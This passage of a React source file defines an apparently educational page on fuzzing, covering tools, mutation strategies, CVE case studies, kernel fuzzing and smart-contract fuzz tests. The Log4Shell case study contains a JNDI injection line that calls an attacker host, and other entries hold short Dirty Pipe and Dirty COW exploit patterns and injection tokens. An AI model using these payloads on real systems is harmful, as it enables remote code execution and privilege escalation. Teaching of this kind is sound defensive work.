import React, { useEffect, useState } from "react";
import {
  Box,
  Typography,
  Paper,
  alpha,
  useTheme,
  useMediaQuery,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Chip,
  IconButton,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Tooltip,
  Grid,
  Divider,
  Drawer,
  Fab,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Button,
  LinearProgress,
  keyframes,
} from "@mui/material";
import { Link, useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import BugReportIcon from "@mui/icons-material/BugReport";
import WarningAmberIcon from "@mui/icons-material/WarningAmber";
import SpeedIcon from "@mui/icons-material/Speed";
import CodeIcon from "@mui/icons-material/Code";
import MemoryIcon from "@mui/icons-material/Memory";
import StorageIcon from "@mui/icons-material/Storage";
import HttpIcon from "@mui/icons-material/Http";
import TerminalIcon from "@mui/icons-material/Terminal";
import QuizIcon from "@mui/icons-material/Quiz";
import BuildIcon from "@mui/icons-material/Build";
import SchoolIcon from "@mui/icons-material/School";
import SettingsIcon from "@mui/icons-material/Settings";
import SecurityIcon from "@mui/icons-material/Security";
import WebIcon from "@mui/icons-material/Web";
import AutoFixHighIcon from "@mui/icons-material/AutoFixHigh";
import DataObjectIcon from "@mui/icons-material/DataObject";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";

// ========== CYBERPUNK ANIMATIONS ==========
const glowPulse = keyframes`
  0%, 100% { box-shadow: 0 0 5px currentColor, 0 0 10px currentColor, 0 0 15px currentColor; }
  50% { box-shadow: 0 0 10px currentColor, 0 0 20px currentColor, 0 0 30px currentColor; }
`;

const neonFlicker = keyframes`
  0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
  20%, 24%, 55% { opacity: 0.6; }
`;

const scanLine = keyframes`
  0% { transform: translateY(-100%); }
  100% { transform: translateY(100vh); }
`;

const gradientShift = keyframes`
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
`;

const textGlitch = keyframes`
  0%, 100% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff; }
  25% { text-shadow: -2px 0 #ff00ff, 2px 0 #00ffff; }
  50% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffff; }
  75% { text-shadow: -2px 2px #ff00ff, 2px -2px #00ffff; }
`;

const borderGlow = keyframes`
  0%, 100% { border-color: #00ffff; box-shadow: 0 0 10px #00ffff, inset 0 0 10px rgba(0,255,255,0.1); }
  33% { border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff, inset 0 0 10px rgba(255,0,255,0.1); }
  66% { border-color: #ff0080; box-shadow: 0 0 10px #ff0080, inset 0 0 10px rgba(255,0,128,0.1); }
`;

// ========== CYBERPUNK COLOR PALETTE ==========
const cyber = {
  neonCyan: "#00ffff",
  neonMagenta: "#ff00ff",
  neonPink: "#ff0080",
  neonPurple: "#8b5cf6",
  neonGreen: "#39ff14",
  neonYellow: "#ffff00",
  darkBg: "#0a0a0f",
  darkPanel: "#0d0d14",
  darkCard: "#12121a",
  gridColor: "rgba(0, 255, 255, 0.03)",
};

interface TopicSection {
  title: string;
  icon?: React.ReactNode;
  content: string;
  points?: string[];
  code?: string;
  codeLanguage?: string;
  warning?: string;
  tip?: string;
  table?: { headers: string[]; rows: string[][] };
}

interface FuzzingTool {
  name: string;
  target: string;
  description: string;
  installCmd: string;
  exampleCmd: string;
  bestFor: string[];
}

const fuzzingTools: FuzzingTool[] = [
  {
    name: "AFL++ (American Fuzzy Lop)",
    target: "Binaries (C/C++)",
    description: "Industry-standard coverage-guided fuzzer with genetic algorithms. Instruments code at compile time for maximum efficiency.",
    installCmd: "apt install afl++ # or build from source",
    exampleCmd: "afl-fuzz -i input_corpus -o findings -- ./target_binary @@",
    bestFor: ["Native binaries", "File parsers", "Protocol handlers", "Libraries"],
  },
  {
    name: "libFuzzer",
    target: "C/C++ Libraries",
    description: "LLVM's in-process, coverage-guided fuzzer. Links directly with target code for fast iteration.",
    installCmd: "# Included with clang/LLVM",
    exampleCmd: "clang -fsanitize=fuzzer,address target.c -o fuzzer && ./fuzzer corpus/",
    bestFor: ["API fuzzing", "Library functions", "Unit-level testing", "Memory bugs"],
  },
  {
    name: "Honggfuzz",
    target: "Binaries & Libraries",
    description: "Multi-process fuzzer with hardware-based code coverage via Intel BTS/PT. Excellent for parallel fuzzing.",
    installCmd: "apt install honggfuzz",
    exampleCmd: "honggfuzz -i input/ -o output/ -- ./target ___FILE___",
    bestFor: ["Parallel fuzzing", "Hardware coverage", "Persistent mode", "Network services"],
  },
  {
    name: "ffuf (Fuzz Faster U Fool)",
    target: "Web Applications",
    description: "Fast web fuzzer written in Go. Discovers hidden paths, parameters, virtual hosts, and more.",
    installCmd: "go install github.com/ffuf/ffuf/v2@latest",
    exampleCmd: "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301",
    bestFor: ["Directory discovery", "Parameter fuzzing", "Subdomain enum", "API endpoints"],
  },
  {
    name: "Burp Suite Intruder",
    target: "Web Applications",
    description: "GUI-based web fuzzer with payload generation, encoding, and response analysis. Part of Burp Suite.",
    installCmd: "# Download from PortSwigger",
    exampleCmd: "# GUI-based: Capture request > Send to Intruder > Configure payloads > Start attack",
    bestFor: ["Auth bypass", "SQLi/XSS testing", "Business logic", "Parameter tampering"],
  },
  {
    name: "Radamsa",
    target: "Any Input Format",
    description: "Test case generator that mutates existing inputs. Works with any file format without instrumentation.",
    installCmd: "apt install radamsa # or compile from gitlab",
    exampleCmd: "radamsa -n 1000 -o fuzz-%n.txt sample.txt",
    bestFor: ["Quick fuzzing", "File format testing", "No source code", "Seed mutation"],
  },
  {
    name: "Jazzer",
    target: "Java/JVM Applications",
    description: "Coverage-guided fuzzer for JVM languages. Integrates with JUnit for easy adoption.",
    installCmd: "# Add jazzer-api dependency or use standalone",
    exampleCmd: "@FuzzTest void myFuzzTest(FuzzedDataProvider data) { ... }",
    bestFor: ["Java libraries", "Kotlin code", "JVM security", "Deserialization bugs"],
  },
  {
    name: "Atheris",
    target: "Python Applications",
    description: "Coverage-guided Python fuzzer from Google. Works with native extensions via libFuzzer.",
    installCmd: "pip install atheris",
    exampleCmd: "atheris.Setup(sys.argv, TestOneInput)\natheris.Fuzz()",
    bestFor: ["Python libraries", "Data parsers", "Native extensions", "Protocol implementations"],
  },
];

const mutationStrategies = [
  {
    name: "Bit Flipping",
    description: "Flip individual bits in the input to trigger off-by-one errors and boundary conditions",
    example: "0x41 > 0x40, 0x42, 0x61, 0xC1",
    finds: ["Integer overflows", "Sign confusion", "Boundary violations"],
  },
  {
    name: "Byte Replacement",
    description: "Replace bytes with interesting values (0x00, 0xFF, format strings, etc.)",
    example: "'AAAA' > '\\x00\\x00\\x00\\x00', '%s%s%s%s'",
    finds: ["Null dereferences", "Format string bugs", "Injection points"],
  },
  {
    name: "Block Operations",
    description: "Insert, delete, or duplicate chunks of data to break parsers",
    example: "Header + Data > Header + Header + Data + Data",
    finds: ["Buffer overflows", "Parser confusion", "Length mismatches"],
  },
  {
    name: "Arithmetic Mutation",
    description: "Add/subtract small values from integers to hit boundaries",
    example: "size=100 > size=99, 101, 0, -1, MAX_INT",
    finds: ["Integer overflow", "Allocation bugs", "Loop bounds"],
  },
  {
    name: "Dictionary-Based",
    description: "Insert known interesting tokens from a dictionary",
    example: "Insert: 'SELECT', '<script>', '../', '{{7*7}}'",
    finds: ["Injection flaws", "XSS", "Path traversal", "SSTI"],
  },
  {
    name: "Havoc Mode",
    description: "Combine multiple mutations randomly for chaotic testing",
    example: "Flip + Insert + Delete + Replace in one pass",
    finds: ["Complex state bugs", "Unexpected combinations", "Deep code paths"],
  },
];

const interestingPayloads = {
  integers: [
    { value: "0", reason: "Zero/null case" },
    { value: "-1", reason: "Signed underflow" },
    { value: "0x7FFFFFFF", reason: "Max 32-bit signed" },
    { value: "0x80000000", reason: "Min 32-bit signed" },
    { value: "0xFFFFFFFF", reason: "Max 32-bit unsigned / -1" },
    { value: "0x100", reason: "Just over 255 (byte overflow)" },
    { value: "0x10000", reason: "Just over 65535 (short overflow)" },
    { value: "length-1, length+1", reason: "Off-by-one boundaries" },
  ],
  strings: [
    { value: "'' (empty)", reason: "Empty string handling" },
    { value: "'A' x 10000", reason: "Buffer overflow trigger" },
    { value: "'%s%s%s%s%n'", reason: "Format string" },
    { value: "'${7*7}'", reason: "Template injection" },
    { value: "'\\x00'", reason: "Null byte injection" },
    { value: "Unicode: 'A' (\\u0100)", reason: "UTF-8 boundary" },
    { value: "'\\r\\n\\r\\n'", reason: "HTTP header injection" },
  ],
  formats: [
    { value: "Invalid magic bytes", reason: "File type confusion" },
    { value: "Truncated headers", reason: "Incomplete parsing" },
    { value: "Nested structures x 1000", reason: "Stack exhaustion" },
    { value: "Size field > actual data", reason: "OOB read" },
    { value: "Size field = 0", reason: "Division by zero" },
    { value: "Circular references", reason: "Infinite loops" },
  ],
};

// ========== REAL-WORLD CVE CASE STUDIES ==========
const cveStudies = [
  {
    cve: "CVE-2014-0160 (Heartbleed)",
    severity: "Critical",
    target: "OpenSSL",
    discovery: "Codenomicon & Google Security",
    description: "Buffer over-read in TLS heartbeat extension allowed attackers to read up to 64KB of server memory, potentially exposing private keys, session tokens, and user data.",
    fuzzingLesson: "Shows importance of fuzzing protocol extensions and boundary conditions. The bug existed for 2+ years before discovery.",
    impact: "Affected ~17% of secure web servers. Billions of devices compromised.",
    code: `// Vulnerable code pattern
memcpy(bp, pl, payload);  // No bounds check on payload length
// Attacker sends: payload_length=64KB, actual_payload=1 byte
// Server returns 64KB of memory`,
  },
  {
    cve: "CVE-2022-0847 (Dirty Pipe)",
    severity: "Critical",
    target: "Linux Kernel",
    discovery: "Max Kellermann",
    description: "Privilege escalation via pipe buffer page cache manipulation. Allowed unprivileged users to overwrite read-only files including SUID binaries.",
    fuzzingLesson: "Kernel fuzzing with syzkaller-style tools can find complex state-dependent bugs in pipe/splice operations.",
    impact: "Affected Linux kernel 5.8+. Easy privilege escalation to root.",
    code: `// Exploit pattern
pipe(pipefd);
splice(file_fd, &offset, pipefd[1], NULL, 1, 0);
write(pipefd[1], data, len);  // Overwrites file!`,
  },
  {
    cve: "CVE-2021-44228 (Log4Shell)",
    severity: "Critical",
    target: "Apache Log4j",
    discovery: "Chen Zhaojun (Alibaba)",
    description: "Remote code execution via JNDI injection in log messages. Any user-controlled string that gets logged could trigger RCE.",
    fuzzingLesson: "Fuzzing with JNDI/LDAP payloads in all input fields. Grammar-based fuzzing for nested expression parsing.",
    impact: "Affected virtually every Java application using Log4j. Massive global impact.",
    code: `// Attack payload
\${jndi:ldap://attacker.com/exploit}
// Logged by: logger.info("User: " + username);
// Triggers LDAP lookup and code execution`,
  },
  {
    cve: "CVE-2023-4863",
    severity: "Critical",
    target: "libwebp (Chrome, Firefox, etc.)",
    discovery: "Apple SEAR & Citizen Lab",
    description: "Heap buffer overflow in WebP lossless compression. Exploited in the wild via malicious images for zero-click attacks.",
    fuzzingLesson: "Image format parsers are high-value fuzzing targets. libFuzzer found thousands of similar bugs.",
    impact: "Affected Chrome, Firefox, Safari, Android, iOS, and countless apps using libwebp.",
    code: `// Found via: clang -fsanitize=fuzzer,address webp_fuzz.c -lwebp
// Heap overflow in BuildHuffmanTable()
// Malformed WebP triggers OOB write`,
  },
  {
    cve: "CVE-2020-0601 (CurveBall)",
    severity: "Critical",
    target: "Windows CryptoAPI",
    discovery: "NSA",
    description: "Spoofing vulnerability in certificate validation for ECC. Allowed attackers to forge certificates that Windows trusted.",
    fuzzingLesson: "Cryptographic implementations need extensive fuzzing. Edge cases in curve parameters often overlooked.",
    impact: "Affected all Windows versions. Could spoof HTTPS, signed executables, emails.",
    code: `// Vulnerable: Accepted certificates with custom curve parameters
// Attack: Craft cert with generator G' = n*G where private_key*G' = public_key
// Windows validates the math but not that G' == standard generator`,
  },
  {
    cve: "CVE-2016-5195 (Dirty COW)",
    severity: "Critical",
    target: "Linux Kernel",
    discovery: "Phil Oester",
    description: "Race condition in copy-on-write (COW) mechanism allowed privilege escalation by writing to read-only memory mappings.",
    fuzzingLesson: "Race conditions require specialized fuzzing with thread scheduling manipulation. Tools like syzkaller excel here.",
    impact: "Existed for 9 years. Affected every Linux system from 2007-2016.",
    code: `// Race condition pattern
mmap(file, READ_ONLY);
// Thread 1: madvise(MADV_DONTNEED) - releases page
// Thread 2: write() - gets fresh writable page
// Result: Write to "read-only" file`,
  },
];

// ========== KERNEL & SYSTEM FUZZING ==========
const kernelFuzzingSections: TopicSection[] = [
  {
    title: "Introduction to Kernel Fuzzing",
    icon: <MemoryIcon />,
    content: "Kernel fuzzing targets the operating system kernel—the most privileged code on a system. Finding bugs here can lead to privilege escalation, denial of service, or complete system compromise. The kernel is the foundation of all system security: it enforces access controls, isolates processes, and mediates all hardware access. A vulnerability in the kernel typically means game over—attackers can escalate from any user to full root/system privileges, escape containers and VMs, and compromise the entire system. Kernel fuzzing is challenging because kernels are large (millions of lines of code), complex (concurrent, asynchronous, hardware-dependent), and have massive attack surfaces (hundreds of system calls, thousands of IOCTLs, file systems, network protocols, device drivers). Traditional userspace fuzzing techniques need adaptation: crashes are harder to detect (kernel oops vs segfault), recovery is slower (requires VM restart), and state management is complex (kernel state persists across syscalls). Despite these challenges, kernel fuzzing has been extraordinarily successful. Google's syzkaller has found over 5,000 bugs in the Linux kernel alone. The key insight is that syscalls—the interface between userspace and kernel—are the primary attack surface, and systematic fuzzing of syscall sequences reveals bugs that decades of manual review missed.",
    points: [
      "High Impact: Kernel bugs affect every process and user on the system—complete compromise",
      "Complex State: Kernels maintain extensive state across syscalls, requiring stateful fuzzing",
      "Privileged Code: Bugs here bypass all userspace security mechanisms and isolation",
      "Race Conditions: Concurrent syscalls expose timing bugs that are hard to find manually",
      "Hardware Interaction: Drivers and hardware interfaces are bug-rich and under-tested",
      "Hypervisor Escape: VM fuzzing can find guest-to-host escapes worth millions in bug bounties",
      "Persistent Threats: Kernel rootkits are extremely hard to detect and remove",
      "Supply Chain: A kernel bug affects every system running that kernel version",
    ],
    warning: "Kernel fuzzing can crash your system and cause data loss. Always use VMs, dedicated test machines, or cloud instances with snapshots!",
  },
  {
    title: "syzkaller - Google's Kernel Fuzzer",
    icon: <TerminalIcon />,
    content: "syzkaller is the industry-standard coverage-guided kernel fuzzer. It has found thousands of bugs in Linux, Windows, FreeBSD, NetBSD, and other kernels. Unlike userspace fuzzers that mutate byte arrays, syzkaller understands syscall semantics and generates sequences of valid (or near-valid) system calls with properly typed arguments. It uses a custom description language called syzlang to specify syscall signatures, argument types, and relationships between calls. For example, syzkaller knows that close() needs a file descriptor returned by open(), and that mmap() needs specific flag combinations. This structure-awareness is crucial because random bytes almost never form valid syscalls—you'd waste most of your time in early error checking code. syzkaller runs multiple VMs in parallel, each executing generated syscall programs and reporting crashes. It uses KCOV (Kernel Coverage) to track which kernel code each program exercises, evolving its corpus toward higher coverage. When crashes occur, syzkaller automatically generates minimal C programs that reproduce the bug—essential for kernel developers to fix issues.",
    code: `# Install syzkaller
git clone https://github.com/google/syzkaller
cd syzkaller && make

# Create VM image (example for QEMU/KVM with Ubuntu)
cd tools/create-image
./create-image.sh --distribution ubuntu --feature full

# Configure syzkaller (syz-manager.cfg)
{
    "target": "linux/amd64",
    "http": "127.0.0.1:56741",        # Web dashboard
    "workdir": "/path/to/workdir",
    "kernel_obj": "/path/to/linux",    # Kernel with debug symbols
    "image": "/path/to/image.img",
    "sshkey": "/path/to/ssh/key",
    "syzkaller": "/path/to/syzkaller",
    "procs": 8,                        # Processes per VM
    "type": "qemu",
    "vm": {
        "count": 4,                    # Number of VMs
        "kernel": "/path/to/bzImage",
        "cpu": 2,
        "mem": 2048
    },
    "enable_syscalls": [               # Optional: focus on specific syscalls
        "open*", "read*", "write*", "ioctl$*"
    ]
}

# Build kernel with coverage and sanitizers
cd /path/to/linux
make defconfig
./scripts/config -e KCOV -e KASAN -e DEBUG_INFO
make -j$(nproc)

# Run syzkaller
./bin/syz-manager -config=syz-manager.cfg
# Open http://127.0.0.1:56741 for dashboard`,
    points: [
      "Syscall Descriptions: Uses syzlang to describe syscall semantics, types, and relationships",
      "Coverage-Guided: Uses KCOV for kernel code coverage to guide program evolution",
      "Reproducers: Automatically generates minimal C programs to reproduce bugs for developers",
      "Multi-VM: Runs parallel VMs for faster fuzzing and crash isolation",
      "Crash Dedup: Groups crashes by unique stack traces to identify distinct bugs",
      "Dashboard: Web UI shows coverage, crash stats, and reproducer status in real-time",
      "Multi-kernel: Supports Linux, Windows, FreeBSD, NetBSD, OpenBSD, Fuchsia, and more",
    ],
    tip: "Start with the default syscall descriptions, then add custom ones for your target subsystem. Focus on under-fuzzed areas: new drivers, complex subsystems, security-critical code.",
  },
  {
    title: "Kernel Address Sanitizer (KASAN)",
    icon: <SecurityIcon />,
    content: "KASAN detects memory bugs in the Linux kernel similar to ASan for userspace. Essential for catching use-after-free, out-of-bounds, and other memory corruption that might not cause immediate crashes. Without KASAN, many kernel memory bugs go undetected because the kernel doesn't immediately crash when accessing freed or out-of-bounds memory—it just reads garbage or corrupts other data structures. This silent corruption can later cause crashes with stack traces that don't point to the root cause, making debugging extremely difficult. KASAN instruments all memory accesses at compile time and maintains shadow memory that tracks which bytes are valid to access. When code accesses invalid memory, KASAN immediately panics with a detailed report showing exactly what went wrong: the type of bug (out-of-bounds, use-after-free, etc.), the accessed address, the allocated object size, and allocation/free stack traces. This transforms subtle memory corruption into clear, debuggable crashes. KASAN has three modes: generic (works everywhere, ~2x slowdown), software tag-based (ARM64, faster), and hardware tag-based (ARM MTE, fastest). For fuzzing, use generic KASAN—the performance cost is worth the bug-finding power.",
    code: `# Enable KASAN in kernel config
CONFIG_KASAN=y
CONFIG_KASAN_GENERIC=y  # Works on all architectures, ~2x slowdown
# OR for ARM64: CONFIG_KASAN_SW_TAGS=y  # Faster with hardware support
CONFIG_KASAN_INLINE=y   # Faster than outline mode, but larger kernel

# Additional useful debugging options
CONFIG_KASAN_STACK=y         # Detect stack out-of-bounds
CONFIG_KASAN_VMALLOC=y       # Check vmalloc'd memory
CONFIG_DEBUG_INFO=y          # For readable stack traces
CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT=y
CONFIG_FRAME_POINTER=y       # Better stack traces
CONFIG_SLUB_DEBUG=y          # SLUB allocator debugging
CONFIG_SLUB_DEBUG_ON=y       # Enable by default (vs boot param)

# Build the kernel
make -j$(nproc)

# KASAN reports look like:
# ==================================================================
# BUG: KASAN: slab-out-of-bounds in vulnerable_function+0x42/0x100
# Write of size 4 at addr ffff888012345678 by task test/1234
#
# CPU: 0 PID: 1234 Comm: test Not tainted 5.15.0-kasan #1
# Call Trace:
#  dump_stack_lvl+0x4a/0x5f
#  print_address_description.constprop.0+0x1f/0x150
#  kasan_report.cold+0x7f/0x11b
#  vulnerable_function+0x42/0x100
#  test_handler+0x28/0x40`,
    points: [
      "KASAN Generic: Works on all architectures, approximately 2x slowdown and 3x memory overhead",
      "KASAN SW Tags: ARM64 only, faster with reduced shadow memory overhead",
      "KASAN HW Tags: ARM64 with MTE, minimal overhead using hardware memory tagging",
      "Quarantine: Delays memory reuse to catch use-after-free bugs with longer delay windows",
      "Stack Instrumentation: Catches stack buffer overflows (requires CONFIG_KASAN_STACK)",
      "Reports: Shows bug type, access size, stack traces for allocation, free, and access",
      "Combine with KCOV for coverage-guided kernel fuzzing—essential for syzkaller",
    ],
  },
  {
    title: "Fuzzing Device Drivers",
    icon: <StorageIcon />,
    content: "Device drivers are a massive attack surface with high complexity and often poor security practices. They're responsible for a large percentage of kernel vulnerabilities and are frequently the target of exploit chains. Drivers run with full kernel privileges but are often written by hardware vendors with less security expertise than core kernel developers, handle complex hardware protocols with many edge cases, and parse untrusted data from devices (USB, network, Bluetooth). A single driver bug can compromise an entire system—this is why 'BadUSB' attacks and malicious WiFi/Bluetooth packets are so dangerous. Fuzzing drivers is challenging because they expect to communicate with hardware. Techniques include: USB gadget fuzzing (emulating malicious USB devices), PCI passthrough fuzzing (corrupting DMA and MMIO), virtio fuzzing (fuzzing virtual device interfaces), and using hardware emulators. syzkaller has built-in support for USB fuzzing using the USB raw gadget interface—it can generate malformed USB descriptors, control transfers, and bulk data that stress-test USB drivers without needing physical hardware. For other driver types, you may need to create custom syzkaller descriptions for the driver's ioctl interface.",
    code: `# USB driver fuzzing with syzkaller
# Enable USB gadget support for fuzzing
CONFIG_USB_GADGET=y
CONFIG_USB_DUMMY_HCD=y     # Virtual USB host controller
CONFIG_USB_RAW_GADGET=y    # Raw access for fuzzing

# syzkaller USB descriptions are included by default
# They fuzz: USB descriptors, control transfers, bulk/interrupt data

# Example: Create custom syzlang for a specific driver
# Save as sys/linux/mydriver.txt
include <linux/mydriver.h>

# Define the device file
resource fd_mydriver[fd]

# Open the device
openat$mydriver(fd const[AT_FDCWD], file ptr[in, string["/dev/mydriver"]], flags flags[open_flags]) fd_mydriver

# Define IOCTLs
ioctl$mydriver_cmd1(fd fd_mydriver, cmd const[MYDRIVER_IOCTL_CMD1], arg ptr[in, mydriver_cmd1_arg])
ioctl$mydriver_cmd2(fd fd_mydriver, cmd const[MYDRIVER_IOCTL_CMD2], arg ptr[out, mydriver_cmd2_result])

# Define argument structures
mydriver_cmd1_arg {
    size    len[data, int32]
    flags   flags[mydriver_flags, int32]
    data    array[int8]
}

mydriver_flags = MYDRIVER_FLAG_A, MYDRIVER_FLAG_B, MYDRIVER_FLAG_C

# Rebuild syzkaller to include new descriptions
make generate
make`,
    warning: "Driver fuzzing often triggers kernel panics and can corrupt hardware state. Use VMs with snapshots for quick recovery. For physical hardware testing, use isolated test systems.",
    points: [
      "USB Fuzzing: Malformed descriptors, endpoints, transfer sizes using USB raw gadget and dummy HCD",
      "PCI/PCIe Fuzzing: Config space manipulation, BAR access patterns, DMA operations via vfio-pci",
      "Network Drivers: Malformed packets, MTU edge cases, checksum errors, fragmentation attacks",
      "Filesystem Drivers: Corrupted disk images, malformed metadata, deep directory trees, symlink loops",
      "GPU Drivers: Command buffers, shader programs, memory management, ioctl interfaces",
      "Bluetooth: L2CAP, RFCOMM, SDP fuzzing for Bluetooth stack vulnerabilities",
      "IOCTL Interface: Most drivers expose IOCTLs—fuzz these with typed syzkaller descriptions",
    ],
  },
];

// ========== SMART CONTRACT FUZZING ==========
const smartContractSections: TopicSection[] = [
  {
    title: "Introduction to Smart Contract Fuzzing",
    icon: <SecurityIcon />,
    content: "Smart contracts handle billions of dollars in value and are immutable once deployed. Fuzzing is essential for finding vulnerabilities before deployment. Unlike traditional software where you can patch bugs after discovery, smart contract bugs are permanent—once deployed on a blockchain, the code cannot be changed. This immutability, combined with direct handling of financial assets, makes pre-deployment security testing critical. The history of DeFi is littered with catastrophic hacks: The DAO hack ($60M), Parity wallet freeze ($280M), Cream Finance ($130M), Ronin bridge ($625M)—all caused by bugs that thorough fuzzing might have caught. Smart contract fuzzing is different from traditional fuzzing in several ways. Contracts are stateful across transactions, so fuzzing must consider sequences of function calls, not just individual inputs. The execution environment (EVM, Solana runtime, etc.) has unique behaviors like gas limits, reentrancy patterns, and integer overflow handling that create unique vulnerability classes. Attack scenarios often involve multiple interacting contracts (flash loans, oracle manipulation) that single-contract testing misses. Effective smart contract fuzzing combines property-based testing (defining invariants that must always hold) with coverage-guided exploration (finding inputs that reach new code paths).",
    points: [
      "Immutable Code: Can't patch bugs after deployment—must get it right before mainnet launch",
      "Financial Impact: Bugs directly lead to fund loss, often millions of dollars in minutes",
      "Complex State: Multi-transaction attack sequences require stateful fuzzing approaches",
      "EVM Quirks: Integer overflow (pre-Solidity 0.8), reentrancy, access control patterns",
      "Gas Limitations: Execution costs affect fuzzing strategy and attack feasibility",
      "Cross-Contract: Interactions between contracts create emergent attack surfaces",
      "Flash Loans: Allow attackers to borrow unlimited capital within a single transaction",
      "Oracle Manipulation: Price feeds can be manipulated to exploit dependent contracts",
    ],
    warning: "Always audit AND fuzz smart contracts before mainnet deployment. Fuzzing finds crashes and invariant violations, but logic bugs and economic attacks may require manual review and formal verification.",
  },
  {
    title: "Echidna - Ethereum Smart Contract Fuzzer",
    icon: <TerminalIcon />,
    content: "Echidna is a property-based fuzzer for Ethereum smart contracts. It generates random transactions to test invariants you define—properties that should ALWAYS hold regardless of what transactions are executed. This approach is powerful because many smart contract bugs are violations of intended invariants: 'total supply should never exceed max supply', 'only the owner can withdraw funds', 'balances should never go negative'. Echidna generates sequences of function calls with random parameters, executes them on the EVM, and checks that your properties still hold. When a property fails, Echidna provides the exact sequence of transactions that violated it—your exploit proof-of-concept. Echidna uses coverage-guided fuzzing internally, meaning it learns from previous transactions to generate more effective future ones. It can also use corpus seeding from existing transaction traces. Writing good properties is an art—they should be specific enough to catch real bugs but general enough to always hold. Start with obvious properties (no negative balances, only owner can admin) and progressively add more subtle ones as you understand your contract better.",
    code: `// Install Echidna
# Using Docker (recommended):
docker pull trailofbits/echidna

# Or via pip:
pip install echidna

// Example Solidity contract with Echidna properties
// Save as TokenTest.sol
pragma solidity ^0.8.0;

import "./Token.sol";

contract TokenTest {
    Token token;

    constructor() {
        token = new Token();
    }

    // PROPERTY 1: Total supply should never exceed max
    // Function name starts with echidna_ and returns bool
    function echidna_max_supply() public view returns (bool) {
        return token.totalSupply() <= token.MAX_SUPPLY();
    }

    // PROPERTY 2: Balances should never underflow/go negative
    function echidna_no_underflow() public view returns (bool) {
        // In Solidity 0.8+, underflow reverts, but check anyway
        return token.balanceOf(address(this)) >= 0;
    }

    // PROPERTY 3: Transfer shouldn't create tokens
    // (sender loses what receiver gains)
    function echidna_transfer_conservation() public returns (bool) {
        uint256 totalBefore = token.totalSupply();
        // Echidna will call random token functions here
        uint256 totalAfter = token.totalSupply();
        return totalAfter == totalBefore;  // Conservation of tokens
    }

    // PROPERTY 4: Only owner can mint
    // This will FAIL if there's an access control bug
    function echidna_only_owner_mints() public view returns (bool) {
        // If we (non-owner) somehow have more tokens than initial...
        return token.balanceOf(address(this)) <= INITIAL_BALANCE;
    }
}

# Run Echidna
echidna TokenTest.sol --contract TokenTest --config echidna.yaml

# echidna.yaml configuration:
testMode: property          # Run property tests
testLimit: 50000           # Number of transactions to try
shrinkLimit: 5000          # Shrinking attempts for counterexamples
seqLen: 100                # Max sequence length
contractAddr: "0x..."      # Address to deploy test contract`,
    tip: "Write properties for invariants that should ALWAYS hold, regardless of transaction sequence. Think about what an attacker could do with unlimited transactions and arbitrary parameters.",
  },
  {
    title: "Foundry Fuzz Testing",
    icon: <CodeIcon />,
    content: "Foundry's built-in fuzzer integrates with your Solidity tests, making it easy to fuzz function parameters without learning a new tool. If you're already using Foundry for development and testing, adding fuzz tests is trivial—just add parameters to your test functions and Foundry automatically generates random values for them. Foundry's fuzzer is type-aware: it knows uint256 should get integer values, addresses should be valid Ethereum addresses, and bytes should be byte arrays. It uses dictionary-based mutation, extracting interesting values from your contract bytecode (constants, magic numbers) to generate more effective test inputs. When a fuzz test fails, Foundry automatically shrinks the input to find the minimal failing case. The `bound()` helper function is crucial—it constrains random values to reasonable ranges, preventing the fuzzer from wasting time on trivially rejected inputs. For example, if testing a transfer function, bound the amount to be less than the sender's balance. Foundry also supports stateful fuzz testing through invariant tests, where it generates sequences of function calls and checks that invariants hold after each sequence.",
    code: `// Foundry fuzz test example
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultFuzzTest is Test {
    Vault vault;
    address attacker = address(0xBAD);

    function setUp() public {
        vault = new Vault();
    }

    // BASIC FUZZ TEST: Parameters are automatically fuzzed
    function testFuzz_DepositWithdraw(uint256 amount) public {
        // Bound the input to reasonable values
        // Without this, most amounts would exceed available ETH
        amount = bound(amount, 1, 1e24);

        // Setup: Give this contract ETH to deposit
        deal(address(this), amount);

        // Action: Deposit then withdraw
        uint256 balanceBefore = address(this).balance;
        vault.deposit{value: amount}();

        // Invariant: Should be able to withdraw what we deposited
        vault.withdraw(amount);

        // Assert: Balance should be unchanged after deposit+withdraw
        assertEq(address(this).balance, balanceBefore, "Lost funds!");
    }

    // ADVANCED: Test reentrancy protection
    function testFuzz_NoReentrancy(uint256 amount) public {
        amount = bound(amount, 1 ether, 100 ether);
        deal(address(this), amount * 2);

        vault.deposit{value: amount}();

        // Create malicious contract that tries reentrancy
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(vault));
        deal(address(attacker), amount);

        // This should fail or at least not drain more than deposited
        vm.expectRevert();  // If properly protected
        attacker.attack{value: amount}();
    }

    // INVARIANT TEST: Checks property after many random calls
    function invariant_vaultSolvency() public {
        // Vault should always have enough ETH to cover all deposits
        assertGe(
            address(vault).balance,
            vault.totalDeposits(),
            "Vault is insolvent!"
        );
    }

    // Required to receive ETH
    receive() external payable {}
}

// Run with Foundry
// forge test --fuzz-runs 10000  # 10k fuzz iterations
// forge test --fuzz-seed 12345 # Reproducible runs`,
    points: [
      "Integrated: No separate tool needed, works seamlessly with forge test",
      "Type-Aware: Generates appropriate values for Solidity types automatically",
      "Shrinking: Automatically minimizes failing inputs to find root cause",
      "Dictionary: Learns from contract bytecode for better, targeted coverage",
      "Configurable: Set runs, seed, and depth in foundry.toml for reproducibility",
      "bound() helper: Constrain inputs to valid ranges for more effective testing",
